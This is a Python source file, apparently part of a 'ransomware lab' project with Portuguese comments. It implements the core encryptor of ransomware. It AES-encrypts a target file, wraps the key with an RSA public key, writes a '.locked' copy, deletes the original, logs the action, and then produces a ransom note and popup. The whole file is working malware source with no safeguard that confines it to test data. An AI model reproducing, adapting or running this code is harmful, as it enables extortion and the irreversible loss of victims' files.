# File: core/encryptor.py
import os
import sys
import zlib
import json
import hashlib
from datetime import datetime, timezone

# Ajusta sys.path para importar pacotes do projeto
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

from ransom.ransom_note_generator import generate_ransom_note
from ransom.auto_popup_stager import auto_invoke_popup

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn

# Inicializa Rich console
console = Console()
MAGIC_BYTES = b'LOCKED_RANSOMLAB'
LOCKED_EXT = '.locked'


def is_already_encrypted(file_path: str) -> bool:
    return file_path.endswith(LOCKED_EXT)


def sha256_digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def encrypt_file(file_path: str, rsa_public_key_path: str, uid: str, compress: bool = True) -> None:
    console.clear()
    console.print(Panel(f"[bold red]Encrypting[/bold red] {os.path.basename(file_path)}", title="Encryptor BRUTAL", border_style="red"))

    # Validações
    if not os.path.isfile(file_path):
        console.print(f"[red]Arquivo não encontrado:[/red] {file_path}")
        return
    if is_already_encrypted(file_path):
        console.print(f"[yellow]SKIP: já criptografado →[/yellow] {file_path}")
        return
    if not os.path.isfile(rsa_public_key_path):
        console.print(f"[red]Chave pública não encontrada:[/red] {rsa_public_key_path}")
        return

    try:
        # Leitura do arquivo
        with Progress(SpinnerColumn(), TextColumn("{task.description}"), console=console) as prog:
            task = prog.add_task("Reading file", total=None)
            with open(file_path, 'rb') as f:
                original_data = f.read()
            prog.update(task, description="File loaded")
            prog.stop_task(task)

        # Hash original
        sha_orig = sha256_digest(original_data)

        # Compressão opcional
        if compress:
            with Progress(SpinnerColumn(), TextColumn("Compressing data"), console=console) as prog:
                task = prog.add_task("Compressing", total=None)
                data_to_encrypt = zlib.compress(original_data)
                prog.update(task, description="Compressed")
                prog.stop_task(task)
        else:
            data_to_encrypt = original_data

        # Geração de AES key e IV
        aes_key = get_random_bytes(32)
        iv = get_random_bytes(16)

        # Padding + AES encrypt
        padding_len = (16 - len(data_to_encrypt) % 16)
        padded = data_to_encrypt + bytes([padding_len]) * padding_len
        with Progress(SpinnerColumn(), BarColumn(), TimeElapsedColumn(), console=console) as prog:
            task = prog.add_task("AES Encrypt", total=len(padded))
            cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
            encrypted_data = cipher_aes.encrypt(padded)
            prog.update(task, advance=len(padded))

        # RSA encrypt key
        with Progress(SpinnerColumn(), TextColumn("Encrypting key (RSA)"), console=console) as prog:
            task = prog.add_task("RSA Encrypt Key", total=None)
            with open(rsa_public_key_path, 'rb') as kf:
                rsa_key = RSA.import_key(kf.read())
            cipher_rsa = PKCS1_OAEP.new(rsa_key)
            encrypted_key = cipher_rsa.encrypt(aes_key)
            prog.update(task, description="Key encrypted")
            prog.stop_task(task)

        # Montagem do arquivo .locked
        locked_file = file_path + LOCKED_EXT
        with open(locked_file, 'wb') as lf:
            lf.write(MAGIC_BYTES)
            lf.write(len(encrypted_key).to_bytes(2, 'big'))
            lf.write(encrypted_key)
            lf.write(iv)
            lf.write(encrypted_data)

        # Hash criptografado
        sha_locked = sha256_digest(encrypted_data)

        # Log
        log = {
            "uid": uid,
            "original_file": file_path,
            "encrypted_file": locked_file,
            "sha256_original": sha_orig,
            "sha256_encrypted": sha_locked,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        os.makedirs("output", exist_ok=True)
        log_path = os.path.join("output", f"log_{uid}.json")
        with open(log_path, 'a', encoding='utf-8') as lf:
            lf.write(json.dumps(log) + '\n')

        # Remove original
        os.remove(file_path)
        console.print(Panel(f"[green]Encrypted →[/green] {locked_file}", border_style="green"))

        # Exibe log
        table = Table(show_header=True, header_style="bold cyan")
        table.add_column("Field")
        table.add_column("Value", overflow="fold")
        for k, v in log.items():
            table.add_row(k, str(v))
        console.print(table)

        # Ransom note + popup
        note_path = generate_ransom_note(uid)
        console.print(Panel(f"Ransom note: {note_path}", border_style="magenta"))
        auto_invoke_popup(note_path)

    except Exception as e:
        console.print(Panel(f"[red]Encryption failed:[/red]\n{e}", border_style="red"))

if __name__ == '__main__':
    if len(sys.argv) < 4:
        console.print("[yellow]Uso: python core/encryptor.py <file> <public.pem> <UID>")
        sys.exit(1)
    _, fp, pub, uid = sys.argv
    encrypt_file(fp, pub, uid)
